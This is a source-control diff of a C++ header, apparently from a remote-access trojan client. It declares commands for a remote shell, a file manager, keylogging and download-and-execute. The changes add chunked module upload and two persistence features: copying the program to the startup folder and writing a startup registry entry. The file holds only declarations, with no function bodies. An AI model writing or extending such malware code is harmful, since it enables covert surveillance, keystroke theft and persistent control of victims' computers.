@@ -1,5 +1,5 @@
 #pragma once
-#include "EventHandler.h"
+#include "..\Common\MsgHandler.h"
 
 #define KNEL	('K'|('N'<<8)|('E'<<16)|('L'<<24))
 
@@ -17,8 +17,15 @@
 
 #define KNEL_RESTART		(0xea04)
 
-#define KNEL_GETMODULE		(0xea05)
-#define KNEL_MODULE			(0xea07)
+//获取模块信息....
+#define KNEL_GETMODULE_INFO	(0xea05)
+#define KNEL_MODULE_INFO	(0xea07)
+
+#define KNEL_MODULE_CHUNK_GET	(0xfa00)
+#define KNEL_MODULE_CHUNK_DAT	(0xfa01)
+
+//
+#define KNEL_ERROR			(0xea08)
 
 ////
 //#define KNEL_UPLOAD_MODULE_FROMDISK		(0xee08)
@@ -26,7 +33,6 @@
 
 
 
-#define KNEL_MODULE_BUSY				(0xdd00)
 #define KNEL_CMD						(0xdd01)
 #define KNEL_CHAT						(0xdd02)
 #define KNEL_FILEMGR					(0xdd03)
@@ -37,11 +43,13 @@
 #define KNEL_EXIT						(0xdd08)
 #define KNEL_KEYBD_LOG					(0xdd09)
 
+#define KNEL_UTILS_COPYTOSTARTUP		(0xdd0a)
+#define KNEL_UTILS_WRITE_REG			(0xdd0b)
 /*************************************************************************/
 class CModuleMgr;
 
 class CKernel :
-	public CEventHandler
+	public CMsgHandler
 {
 	typedef struct LoginInfo
 	{
@@ -58,6 +66,15 @@ class CKernel :
 		
 	}LoginInfo;
 private:
+	//module upload.....
+
+	string m_current_module;
+	DWORD  m_module_size;
+	DWORD  m_loaded_size;
+	DWORD  m_checksum;
+	char * m_module_buffer;
+
+
 	/********************************************************************/
 	UINT16 icmp_checksum(char*buff, int len);
 	DWORD GetPing(const char*host);
@@ -107,15 +124,31 @@ private:
 	void OnDownloadAndExec(WCHAR*szUrl);
 	void OnExit();
 	void OnKeyboard();
-	void OnModule(const char*Module,DWORD dwLen);
+
+	//模块传输。。。
+	void OnModuleInfo(char* info);
+	void GetModuleChunk();
+	void OnRecvModuleChunk(char* Chunk);
+
+
+	void OnUnilsCopyToStartupMenu();
+	void OnUtilsWriteStartupReg();
 	/*********************************************************************/
 	CModuleMgr *m_pModuleMgr;
-public:
-	void OnConnect();
-	void OnClose();
-	void OnReadComplete(WORD Event, DWORD dwTotal, DWORD dwRead, char*Buffer);
 
-	CKernel();
+	
+
+	static CKernel * m_pInstance;
+
+public:
+	void GetModule(const char* ModuleName);
+
+	void OnOpen();
+	void OnClose();
+	void OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer);
+	void OnWriteMsg(WORD Msg, DWORD dwSize, char*Buffer){}
+
+	CKernel(CManager*pManager);
 	~CKernel();
 };
 
